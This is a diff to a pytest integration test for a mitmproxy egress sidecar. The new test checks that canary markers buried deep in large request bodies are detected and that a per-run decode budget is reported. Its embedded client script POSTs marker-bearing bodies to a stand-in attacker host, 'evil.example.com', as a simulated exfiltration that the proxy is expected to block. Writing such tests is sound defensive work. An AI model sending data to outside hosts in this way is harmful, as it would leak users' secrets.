@@ -4,7 +4,7 @@
 container networking the restricted build environment blocks, so this is gated on ``CI`` and skips
 locally with a stated reason — the same honesty the ``docker``-mark skips carry.
 
-Two tests, in increasing depth:
+Three tests, in increasing depth:
 
 - **smoke**: the image builds and ``mitmdump`` loads our addon (the empty flow log appears). Proves
   Bellwether imports in the mitmproxy runtime and the inside-the-container half runs.
@@ -23,6 +23,13 @@ Two tests, in increasing depth:
   keeps its scoped token had no proof at all. The peer therefore serves both: TLS on 443 with a
   self-signed certificate it generates at start-up, and plain HTTP on 80.
 
+- **deep bodies**: request bodies over the canary scan's first slice (256 KiB) through the
+  running proxy — forwarded to an allowlisted peer and sent to a refused host. The body reaches
+  the hook whole, a marker encoded deep inside it is found, and once the sidecar's per-run decode
+  budget is spent the flow that was cut short says so (§10.4.2). The client and peer scripts and
+  the assertions are shared with a process-level run of the pinned ``mitmdump`` (spec-notes), which
+  is how they were exercised before this test ever reached CI.
+
 The topology avoids needing real DNS or internet: the "provider" is a peer container, named as the
 provider endpoint, so docker's embedded DNS resolves it and classification is plain string matching.
 The denied host is blocked *before* any forward, so it needs no resolution either. On any failure the
@@ -39,11 +46,15 @@ from pathlib import Path
 import pytest
 
 from bellwether.capture import (
+    Canary,
     CapLedger,
     CredentialBroker,
     EgressAllowlist,
     MitmproxySidecar,
+    mint_canaries,
 )
+from bellwether.capture.canary import MAX_SCAN_CHARS, SIDECAR_DECODE_BUDGET_CHARS
+from bellwether.capture.egress import EgressFlow
 from bellwether.capture.proxy_addon import flow_record_line
 from bellwether.determinism import SeededRng
 from bellwether.errors import BellwetherError
@@ -403,6 +414,246 @@ def test_a_real_run_injects_on_forward_blocks_on_deny_and_leaks_nothing(
 def _diagnostics(proxy_name: str) -> str:
     logs = subprocess.run(["docker", "logs", proxy_name], capture_output=True, text=True)
     return f"--- sidecar logs ---\n{logs.stdout[-3000:]}\n{logs.stderr[-3000:]}"
+
+
+# ---------------------------------------------------------------------------
+# deep bodies — past the scan's first slice, through the running proxy (§10.4.2)
+# ---------------------------------------------------------------------------
+
+_COLLECTOR_HOST = "collector-peer"  # a container name, allowlisted as a non-model host
+#: Bytes of padding ahead of the marker in the small deep body (about 400 KiB of base64) and in
+#: the large one (about 6 MiB). Three large bodies exceed the sidecar's 16 MiB decode budget.
+_DEEP_PADDING = 300_000
+_BIG_PADDING = 4_500_000
+
+# A peer that accepts a POST of any size and answers with how many bytes it received, so the
+# client can tell the body was forwarded whole. ``PEER_PORT`` lets the same script run outside a
+# container, where port 80 is not the peer's to bind.
+COLLECTOR_PEER = (
+    "import http.server, os\n"
+    "class H(http.server.BaseHTTPRequestHandler):\n"
+    "    def do_POST(self):\n"
+    "        length = int(self.headers.get('Content-Length', '0'))\n"
+    "        got = 0\n"
+    "        while got < length:\n"
+    "            got += len(self.rfile.read(min(65536, length - got)))\n"
+    "        body = ('received %d' % got).encode()\n"
+    "        self.send_response(200)\n"
+    "        self.send_header('Content-Length', str(len(body)))\n"
+    "        self.end_headers()\n"
+    "        self.wfile.write(body)\n"
+    "    def log_message(self, *a):\n"
+    "        pass\n"
+    "http.server.ThreadingHTTPServer(('0.0.0.0', int(os.environ.get('PEER_PORT', '80'))), H)"
+    ".serve_forever()\n"
+)
+
+# Seven requests through the proxy. Each deep body is one base64 run with a planted marker after
+# its padding, behind a two-character prefix so the run starts off the scan's slice alignment; no
+# whole-value encoding of the marker is in it.
+#   FWD    — the small deep body to the allowlisted peer: forwarded, and found;
+#   DENIED — the same body to a refused host: scanned before the allowlist decides;
+#   BIG0-2 — three large bodies to the refused host, which together exceed the decode budget;
+#   SMALL  — an ordinary request after the budget is spent.
+# ``NO_PROXY`` is cleared because urllib honours it: a client that bypasses the proxy for the
+# peer reaches it directly, gets its 200, and proves nothing — which is what the first local run
+# of this script did, and only the missing flow record showed it.
+DEEP_CLIENT = (
+    "import base64, os, time, urllib.request, urllib.error\n"
+    "for name in ('NO_PROXY', 'no_proxy'):\n"
+    "    os.environ.pop(name, None)\n"
+    "proxy = os.environ['PROXY_URL']\n"
+    "peer = os.environ['PEER_URL']\n"
+    "op = urllib.request.build_opener(urllib.request.ProxyHandler({'http': proxy}))\n"
+    "def deep(marker, padding):\n"
+    "    raw = ('x' * padding + marker + 'y' * 64).encode()\n"
+    "    return b'k=' + base64.b64encode(raw)\n"
+    "def post(url, body, label):\n"
+    "    last = None\n"
+    # Retry: the peer's server may still be binding when the client starts.
+    "    for attempt in range(15):\n"
+    "        started = time.time()\n"
+    "        try:\n"
+    "            r = op.open(urllib.request.Request(url, data=body, method='POST'), timeout=240)\n"
+    "            print(label + '_STATUS', r.status, r.read().decode()[:40])\n"
+    "            print(label + '_SECONDS %.1f' % (time.time() - started))\n"
+    "            return\n"
+    "        except urllib.error.HTTPError as e:\n"
+    "            print(label + '_STATUS', e.code)\n"
+    "            print(label + '_SECONDS %.1f' % (time.time() - started))\n"
+    "            return\n"
+    "        except Exception as e:\n"
+    "            last = e; time.sleep(1)\n"
+    "    print(label + '_ERR', repr(last))\n"
+    "small = deep(os.environ['MARKER_ONE'], int(os.environ['DEEP_PADDING']))\n"
+    "big = deep(os.environ['MARKER_TWO'], int(os.environ['BIG_PADDING']))\n"
+    "print('SMALL_DEEP_BYTES', len(small)); print('BIG_BYTES', len(big))\n"
+    "post(peer + '/ingest', small, 'FWD')\n"
+    "post('http://evil.example.com/x', small, 'DENIED')\n"
+    "for n in range(3):\n"
+    "    post('http://evil.example.com/big', big, 'BIG%d' % n)\n"
+    "post('http://evil.example.com/small', b'ok', 'SMALL')\n"
+)
+
+
+def deep_body_canaries() -> tuple[Canary, Canary]:
+    one, two = mint_canaries(7)[:2]
+    return one, two
+
+
+def deep_client_env(proxy_url: str, peer_url: str) -> dict[str, str]:
+    one, two = deep_body_canaries()
+    return {
+        "PROXY_URL": proxy_url,
+        "PEER_URL": peer_url,
+        "MARKER_ONE": one.marker,
+        "MARKER_TWO": two.marker,
+        "DEEP_PADDING": str(_DEEP_PADDING),
+        "BIG_PADDING": str(_BIG_PADDING),
+    }
+
+
+def assert_deep_bodies(out: str, flows: list[EgressFlow], *, peer_host: str, context: str) -> None:
+    """What a run of :data:`DEEP_CLIENT` through a real proxy must show (§10.4.2, §10.5.2).
+
+    Shared by the container test below and by the process-level run of the pinned ``mitmdump``,
+    so the two cannot drift: the same client, the same peer, the same assertions.
+    """
+    one, two = deep_body_canaries()
+
+    def reported(label: str) -> int:
+        return int(out.split(f"{label} ", 1)[1].split()[0])
+
+    small_bytes, big_bytes = reported("SMALL_DEEP_BYTES"), reported("BIG_BYTES")
+    # The premise: both bodies are past the first slice, and three large ones past the budget.
+    assert small_bytes > MAX_SCAN_CHARS, context
+    assert 3 * (big_bytes - MAX_SCAN_CHARS) > SIDECAR_DECODE_BUDGET_CHARS, context
+
+    # The forwarded leg really went through the proxy and reached the peer whole.
+    assert f"FWD_STATUS 200 received {small_bytes}" in out, context
+    assert "DENIED_STATUS 403" in out, context
+    for label in ("BIG0", "BIG1", "BIG2", "SMALL"):
+        assert f"{label}_STATUS 403" in out, context
+
+    def hits(flow: EgressFlow) -> list[tuple[str, str, str]]:
+        return [(hit.canary_id, hit.via, hit.channel) for hit in flow.canary_hits]
+
+    assert [(f.host, f.path, f.blocked) for f in flows] == [
+        (peer_host, "/ingest", False),
+        ("evil.example.com", "/x", True),
+        ("evil.example.com", "/big", True),
+        ("evil.example.com", "/big", True),
+        ("evil.example.com", "/big", True),
+        ("evil.example.com", "/small", True),
+    ], context
+    forwarded, denied, big0, big1, big2, small = flows
+    # mitmproxy handed the hook each body whole: the record's length is the client's.
+    assert [f.request_body_bytes for f in flows] == [
+        small_bytes,
+        small_bytes,
+        big_bytes,
+        big_bytes,
+        big_bytes,
+        2,
+    ], context
+    # The marker encoded deep in the body is found past the first slice — forwarded or refused.
+    assert hits(forwarded) == [(one.id, "decoded", "body")], context
+    assert hits(denied) == [(one.id, "decoded", "body")], context
+    assert forwarded.canary_decode_limit == denied.canary_decode_limit == "", context
+    # The budget is per run: the first two large bodies are scanned through, the third is cut
+    # short and says so, and the small request after it — scanned in full — carries no limit.
+    assert hits(big0) == hits(big1) == [(two.id, "decoded", "body")], context
+    assert big0.canary_decode_limit == big1.canary_decode_limit == "", context
+    assert big2.canary_hits == (), context
+    assert "reached its budget of" in big2.canary_decode_limit, context
+    assert small.canary_decode_limit == "", context
+    # And no marker is in the record the host reads.
+    log_text = "\n".join(flow_record_line(f) for f in flows)
+    assert one.marker not in log_text and two.marker not in log_text, context
+
+
+def test_a_marker_deep_in_a_large_body_is_found_through_the_running_proxy(
+    sidecar_image: str, network: str, tmp_path: Path
+) -> None:
+    run_id = f"deep-{os.getpid()}"
+    proxy_name = f"bw-proxy-{run_id}"
+    sidecar = MitmproxySidecar(
+        image=sidecar_image,
+        network=network,
+        broker=_broker(),
+        provider_of_host={_PROVIDER_HOST: "anthropic"},
+        shared_dir=tmp_path / "shared",
+        ready_timeout=60.0,
+    )
+    os.environ["ANTHROPIC_API_KEY"] = _REAL_KEY
+    for name in (_COLLECTOR_HOST, proxy_name):
+        subprocess.run(["docker", "rm", "-f", name], capture_output=True, text=True)
+    peer_started = subprocess.run(
+        [
+            "docker",
+            "run",
+            "--rm",
+            "-d",
+            "--name",
+            _COLLECTOR_HOST,
+            "--network",
+            network,
+            sidecar_image,
+            "python3",
+            "-c",
+            COLLECTOR_PEER,
+        ],
+        capture_output=True,
+        text=True,
+    )
+    if peer_started.returncode != 0:
+        pytest.fail(f"could not start the collector peer: {peer_started.stderr}")
+    try:
+        try:
+            sidecar.start(
+                run_id,
+                allowlist=EgressAllowlist(
+                    provider_endpoints=frozenset({_PROVIDER_HOST}),
+                    infrastructure_endpoints=frozenset(),
+                    extra=frozenset({_COLLECTOR_HOST}),
+                ),
+                # One forwarded body is charged to the caps; refused ones are charged to nothing.
+                caps=CapLedger(max_requests=20, max_request_bytes=5_000_000),
+                canaries=deep_body_canaries(),
+            )
+        except BellwetherError as exc:
+            pytest.fail(f"{exc}\n{_diagnostics(proxy_name)}")
+        env_args: list[str] = []
+        for key, value in deep_client_env(sidecar.proxy_url(), f"http://{_COLLECTOR_HOST}").items():
+            env_args += ["-e", f"{key}={value}"]
+        client = subprocess.run(
+            [
+                "docker",
+                "run",
+                "--rm",
+                "--network",
+                network,
+                *env_args,
+                sidecar_image,
+                "python3",
+                "-c",
+                DEEP_CLIENT,
+            ],
+            capture_output=True,
+            text=True,
+            timeout=600,
+        )
+        context = (
+            f"client stdout:\n{client.stdout}\nclient stderr:\n{client.stderr}\n"
+            f"{_diagnostics(proxy_name)}"
+        )
+        assert_deep_bodies(
+            client.stdout, sidecar.flows(), peer_host=_COLLECTOR_HOST, context=context
+        )
+    finally:
+        subprocess.run(["docker", "rm", "-f", _COLLECTOR_HOST], capture_output=True, text=True)
+        sidecar.stop()
+        os.environ.pop("ANTHROPIC_API_KEY", None)
 
 
 def test_the_vendored_hook_list_matches_the_pinned_mitmproxy(sidecar_image: str) -> None:
